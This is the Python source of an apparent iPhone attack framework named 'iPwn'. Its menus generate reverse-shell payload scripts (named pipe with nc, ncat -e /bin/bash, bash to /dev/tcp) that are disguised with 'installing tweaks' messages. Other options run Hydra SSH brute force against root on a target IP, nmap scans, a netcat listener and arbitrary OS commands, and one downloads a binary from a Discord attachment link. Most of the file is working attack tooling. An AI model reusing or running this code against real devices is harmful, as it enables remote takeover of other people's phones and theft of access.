try:
    import os
    import usb
    import socket
    import platform
    import usb.core
    import subprocess
    from time import sleep
except:
    print("Make sure to install the required modules!")


# iPwn
# 05/22/21
# Made by 0x1CA3 | https://github.com/0x1CA3


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
clear()

print("Loading the iPwn Framework...  ", end='', flush=True)
for x in range(3):
    for frame in r'-\|/-\|/':
        print('\b', frame, sep='', end='', flush=True)
        sleep(0.2)
print('\b ')
clear()

bannerhostname = socket.gethostname()
bannerlocalipaddress = socket.gethostbyname(bannerhostname)
bannersystem = platform.system()
bannermachine = platform.machine()
bannerversion = platform.version()
bannerplatform = platform.platform()

# incase the user makes mistakes while typing commands, added common spelling errors.

class helpcom(object):
    displayz = \
        {
        "hlep": "\necho That command is invalid, perhaps you meant 'help'.",
        "paylaod": "\necho That command is invalid, perhaps you meant 'payload'.",
        "listenn": "\necho That command is invalid, perhaps you meant 'listen'.",
        "burte": "\necho That command is invalid, perhaps you meant 'brute'.",
        "commad": "\necho That command is invalid, perhaps you meant 'command'."
        }

def sshh():
    while True:
        sshhinput = input("\n╭─user@ipwn [ssh/brute]\n╰─$ ")
        if sshhinput == "help" or sshhinput == "options":
            print(''' 
            Commands            Description            
            --------            -----------
            help                Displays available commands.
            default             Bruteforces with the most common credentials available. [Make sure you have Hydra installed]
            custom              Attempts to authenticate with the iPhone with your own supplied custom credentials.
            clear               Clears the screen.
            back                Goes back to the main menu.
            ''')
        elif sshhinput == "default":
                sshhinputdefault = input("\n╭─[Enter targets IP]\n╰─$ ")
                os.system("hydra -l root -P wordlist.txt {} -t 4 ssh".format(sshhinputdefault))
        elif sshhinput == "custom":
                sshhinputcustom = input("╭─[Enter targets IP]\n╰─$ ")
                os.system("ssh root@{}".format(sshhinputcustom))
        elif sshhinput == "clear":
            clear()
        elif sshhinput == "back":
            mainshell()
        else:
            print(f"Command [{sshhinput}] was not found.")

def payloadss():
    print("\nStarting the Payload Factory...  ", end='', flush=True)
    for x in range(3):
        for frame in r'-\|/-\|/':
            print('\b', frame, sep='', end='', flush=True)
            sleep(0.2)
    print('\b ')
    print("The Payload Factory has successfully loaded, use 'help' or 'options' for commands.")
    while True:
        payloadssinput = input("\n╭─user@ipwn [payloads/factory]\n╰─$ ")
        if payloadssinput == "help" or payloadssinput == "options":
            print(''' 
            Commands               Description
            --------               -----------
            help                   Displays available commands.
            list                   Lists all the available payloads/options.
            use [specific/payload] Uses the payload the payload that you select. Example: payloads/factory/reverse_bash
            clear                  Clears the screen.
            back                   Goes back to the main menu.
            ''')
        elif payloadssinput == "list":
            print(''' 
            Payloads
            --------
            payloads/factory/reverse_bsd
            payloads/factory/reverse_bash
            payloads/factory/reverse_netcat
            ''')
        elif payloadssinput == "clear":
            clear()
        elif payloadssinput == "back":
            mainshell()
        elif payloadssinput == "use payloads/factory/reverse_bsd":
            payload1input = input("\n╭─[Enter IP]\n╰─$ ")
            payload1inputport = input("\n╭─[Enter Port]\n╰─$ ")
            payload1 = open("payloads/payload_netcat_openbsd.sh","w")
            payload1.write(f'''
echo installing tweaks......
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {payload1input} {payload1inputport} >/tmp/f
            ''')
            payload1.close()
            print("Payload generated!")
        elif payloadssinput == "use payloads/factory/reverse_netcat":
            payloadnetcat = input("\n╭─[Enter IP]\n╰─$ ")
            payloadnetcatport = input("\n╭─[Enter Port]\n╰─$ ")
            payload2 = open("payloads/payload_netcat.sh", "w")
            payload2.write(f''' 
echo installing tweaks....
ncat {payloadnetcat} {payloadnetcatport} -e /bin/bash
            ''')
            payload2.close()
            print("Payload generated!")
        elif payloadssinput == "use payloads/factory/reverse_bash":
            payloadbashinput = input("\n╭─[Enter IP]\n╰─$ ")
            payloadbashport = input("\n╭─[Enter Port]\n╰─$ ")
            payload3 = open("payloads/payload_bash.sh", "w")
            payload3.write(f''' 
echo installing tweaks....
bash -i >& /dev/tcp/{payloadbashinput}/{payloadbashport} 0>&1
            ''')
            payload3.close()
            print("Payload generated!")
        else:
            print(f"Command [{payloadssinput}] was not found.")

def terminal():
    print("To return back to the main menu, use the 'back' command.")
    while True:
        terminalinput = input("\n╭─user@terminal [Terminal]\n╰─$ ")
        if terminalinput == "back":
            clear()
            banner()
            mainshell()
        os.system("{}".format(terminalinput))

def listn():
    listninput = input("Enter port to listen on > ")
    print("\nTo stop listening and return back to the main menu, do CTRL + C.")
    print("Listener started!")
    if os.name == "nt":
        os.system("ncat -lvp {}".format(listninput))
    else:
        os.system("nc -lvp {}".format(listninput))

# physical tools
def check_online():
    device = usb.core.find(idVendor=0x5AC, idProduct=0x12a8)
    if device is None:
        raise ValueError("Your iOS device is not connected!")
    else:
        print("Device is connected! [0x5AC, 0x12A8]")

def dfu():
    dev = usb.core.find(idVendor=0x5AC, idProduct=0x1227)
    if dev is None:
        raise ValueError("Your iOS device is not connected in DFU mode!")
    else:
        print("Device is connected in DFU! [0x5AC, 0x1227]")

#physical tools end

def phy():
    while True:
        phy = input("\n╭─user@ipwn [physical/ios/tools]\n╰─$ ")
        if phy == "help" or phy == "options":
            print(''' 
            Commands               Description
            --------               -----------
            help                   Displays available commands.
            pair                   Pair your iOS device with your computer.
            online_check           Checks if the iOS device is connected to the computer.
            dfu_check              Checks if the iOS device is in DFU mode.
            jailbreak              Installs checkra1n. -> [Make sure your iOS device is supported]
            clear                  Clears the screen.
            back                   Goes back to the main menu.
            ''')
        elif phy == "online_check":
            check_online()
        elif phy == "dfu_check":
            dfu()
        elif phy == "jailbreak":
            os.system("curl https://cdn.discordapp.com/attachments/831366837966733342/849353496720441394/checkra1n --output checkra1n")
        elif phy == "pair":
            os.system("idevicepair pair")
        elif phy == "clear":
            clear()
        elif phy == "back":
            mainshell()
        else:
            print(f"Command [{phy}] was not found.")

def mainshell():
    while True:
        maininput = input("\n╭─user@ipwn\n╰─$ ")
        if maininput == "help" or maininput == "options":
            print(''' 
            Commands            Description
            --------            -----------
            help                Displays available commands.
            payload             Creates a payload.
            listen              Starts the listener. [Make sure you have Netcat installed]
            brute               Loads options for SSH-Bruteforcing to get into the target iPhone. Use 'help'.
            scan                Scan the target iOS device with Nmap. [Make sure you have Nmap installed]
            tools               Loads options for tinkering with iOS devices you have physical access to.
            command             Execute an OS command.
            banner              Prints the banner.
            clear               Clears the screen.
            exit                Exits the framework.
            ''')
        elif maininput == "clear" or maininput == "cls":
            clear()
        elif maininput == "command" or maininput == "terminal":
            terminal()
        elif maininput == "brute":
            sshh()
        elif maininput == "banner":
            clear()
            banner()
        elif maininput == "scan":
            nmapscaninput = input("\n╭─[Enter targets IP]\n╰─$ ")
            os.system("nmap -Pn -sV {}".format(nmapscaninput))
        elif maininput == "payload":
            payloadss()
        elif maininput == "listen":
            listn()
        elif maininput == "tools":
            phy()
        elif maininput == "exit" or maininput == "quit":
            exit()
        elif maininput == "hlep" or maininput == "hpel" or maininput == "hlpe" or maininput == "helpp" or maininput == "lhep":
            subprocess.call(helpcom.displayz["hlep"], shell=True)
        elif maininput == "paylaod" or maininput == "paylod" or maininput == "paylad" or maininput == "pyload" or maininput == "payloda" or maininput == "pyalod":
            subprocess.call(helpcom.displayz["paylaod"], shell=True)
        elif maininput == "burte" or maininput == "bruet" or maininput == "berte" or maininput == "buter" or maininput == "bture" or maininput == "butre":
            subprocess.call(helpcom.displayz["burte"], shell=True)
        elif maininput == "commnad" or maininput == "comand" or maininput == "commad" or maininput == "comad":
            subprocess.call(helpcom.displayz["commad"], shell=True)
        elif maininput == "litsen" or maininput == "listne" or maininput == "litens":
            subprocess.call(commandz.commandz["listenn"], shell=True)
        else:
            print(f"Command [{maininput}] was not found.")

def banner():
    print(f'''
    .___          System Info ──── Logged in as: {bannerhostname}
    |   |_______  _  ______        IP: {bannerlocalipaddress}
    |   \____ \ \/ \/ /    \       System: {bannersystem}  
    |   |  |_> >     /   |  \\      Machine: {bannermachine}
    |___|   __/ \/\_/|___|  /      Version: {bannerversion}
        |__|              \/       Platform: {bannerplatform}
    
    Made by https://github.com/0x1CA3
    Use 'help' or 'options' for commands.''')
banner()
mainshell()